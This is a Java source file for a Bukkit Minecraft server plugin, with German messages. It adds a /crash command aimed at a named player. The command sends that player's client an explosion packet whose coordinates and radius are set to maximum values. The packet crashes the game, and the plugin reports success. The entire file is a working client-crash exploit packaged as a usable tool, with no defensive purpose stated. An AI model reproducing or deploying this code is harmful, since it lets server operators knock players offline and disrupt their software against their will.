package de.etiiomc.crash.main;

import java.util.Collections;
import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.Vec3D;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

public class crash implements CommandExecutor {
	FileConfiguration cfg;
	  
	public crash(FileConfiguration config)
	{
	  this.cfg = config;
	}
  @SuppressWarnings("unchecked")
public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args)
  {
    Player p = (Player)sender;
    if (!p.hasPermission("etiiomc.crash.use"))
    {
      p.sendMessage(this.cfg.getString("crash.prefix") + this.cfg.getString("crash.nopermissions"));
    }
    else if (args.length == 0)
    {
      p.sendMessage(this.cfg.getString("crash.prefix") + "§c/crash <Spieler>");
    }
    else if (args.length == 1)
    {
      Player target = Bukkit.getServer().getPlayer(args[0]);
      if (target == null)
      {
        p.sendMessage(this.cfg.getString("crash.prefix") + "§cDieser Spieler ist nicht online!");
      }
      else if (target.getName().equalsIgnoreCase(p.getName()))
      {
        p.sendMessage(this.cfg.getString("crash.prefix") + "§cDu kannst dich nicht selber crashen!");
      }
      else if (target.getName().equalsIgnoreCase(this.cfg.getString("crash.nothim")))
      {
        p.sendMessage(this.cfg.getString("crash.prefix") + this.cfg.getString("crash.nothimerror"));
      }
      else
      {
        ((CraftPlayer)target).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.EMPTY_LIST, new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
        p.sendMessage(this.cfg.getString("crash.prefix") + "§7Du hast das Spiel von " + target.getName() + " erfolgreich gecrasht!");
      }
    }
    else
    {
      p.sendMessage(this.cfg.getString("crash.prefix") + "§c/crash <Spieler>");
    }
	
	if(cmd.getName().equalsIgnoreCase("crashmanager")) {
		p.sendMessage(this.cfg.getString("crash.prefix") + "§6CrashManager §e| §cby etiiomc");
	}
    return false;
  }
}